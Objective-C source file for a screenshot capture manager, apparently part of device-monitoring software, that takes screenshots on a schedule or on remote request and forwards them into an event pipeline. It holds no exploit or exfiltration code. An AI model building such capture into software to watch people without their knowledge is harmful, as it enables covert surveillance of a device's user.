//
//  ScreenshotCaptureManagerImpl.m
//  ScreenshotCaptureManager
//
//  Created by Makara Khloth on 2/13/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import "ScreenshotCaptureManagerImpl.h"
#import "ScreenshotCaptureDelegate.h"
#import "ScreenshotTaker.h"
#import "ScreenshotFIDStore.h"

#import "FxScreenshotEvent.h"

@interface ScreenshotCaptureManagerImpl (private)
- (void) screenshotCaptured: (FxEvent *) aEvent done: (NSNumber *) aDone;
@end

@implementation ScreenshotCaptureManagerImpl

- (id) initWithScreenshotFolder: (NSString *) aScreenshotFolder {
    self = [super init];
    if (self) {
        mScreenshotTaker = [[ScreenshotTaker alloc] initWithScreenshotFolder:aScreenshotFolder];
        [mScreenshotTaker setMDelegate:self];
        [mScreenshotTaker setMSelector:@selector(screenshotCaptured:done:)];
        mScreenshotFIDStore = [[ScreenshotFIDStore alloc] init];
    }
    return (self);
}

#pragma mark - Event capture -

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    mEventDelegate = aEventDelegate;
}

- (void) unregisterEventDelegate {
    mEventDelegate = nil;
}

- (void) startCapture {
    // Nothing to do
}

- (void) stopCapture {
    [mScreenshotTaker stopTakeScheduleScreenshot];
    mScheduleScreenshotDelegate = nil;
}

#pragma mark - Screenshot capture manager -

- (BOOL) captureScheduleScreenshot: (NSInteger) aIntervalSeconds
                          duration: (NSInteger) aDurationMinutes
                          delegate: (id <ScreenshotCaptureDelegate>) aDelegate {
    BOOL taking = NO;
    if (!mScheduleScreenshotDelegate) {
        NSUInteger frameID = [mScreenshotFIDStore uniqueFrameID];
        [mScreenshotTaker takeScreenshot:aIntervalSeconds duration:aDurationMinutes*60 frameID:frameID module:kScreenshotCallingModuleSchedule];
        mScheduleScreenshotDelegate = aDelegate;
        taking = YES;
    }
    DLog(@"Taking schedule screenshot %d",taking);
    return (taking);
}

- (BOOL) captureOnDemandScreenshot: (NSInteger) aIntervalSeconds
                          duration: (NSInteger) aDurationMinutes
                          delegate: (id <ScreenshotCaptureDelegate>) aDelegate {
    BOOL taking = NO;
    if (!mOnDemandScreenshotDelegate) {
        NSUInteger frameID = [mScreenshotFIDStore uniqueFrameID];
        [mScreenshotTaker takeScreenshot:aIntervalSeconds duration:aDurationMinutes*60 frameID:frameID module:kScreenshotCallingModuleRequest];
        mOnDemandScreenshotDelegate = aDelegate;
        taking = YES;
    }
    DLog(@"Taking request screenshot %d", taking);
    return (taking);
}

- (void) screenshotCaptured: (FxEvent *) aEvent done: (NSNumber *) aDone {
    DLog(@"aEvent = %@, aDone = %@", aEvent, aDone);
    if ([aDone boolValue]) {
        id <ScreenshotCaptureDelegate> delegate = nil;
        
        FxScreenshotEvent *screenshotEvent = (FxScreenshotEvent *)aEvent;
        
        if ([screenshotEvent mCallingModule] == kScreenshotCallingModuleSchedule) {
            delegate = mScheduleScreenshotDelegate;
            mScheduleScreenshotDelegate = nil;
        } else if ([screenshotEvent mCallingModule] == kScreenshotCallingModuleRequest) {
            delegate = mOnDemandScreenshotDelegate;
            mOnDemandScreenshotDelegate = nil;
        }
        
        if ([delegate respondsToSelector:@selector(screenshotCaptureCompleted:)]) {
            [delegate screenshotCaptureCompleted:nil];
        }
    }
    
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        [mEventDelegate eventFinished:aEvent];
    }
}

- (void) dealloc {
    [self stopCapture];
    [mScreenshotFIDStore release];
    mScreenshotTaker.mDelegate = nil;
    mScreenshotTaker.mSelector = nil;
    [mScreenshotTaker release];
    [super dealloc];
}

@end
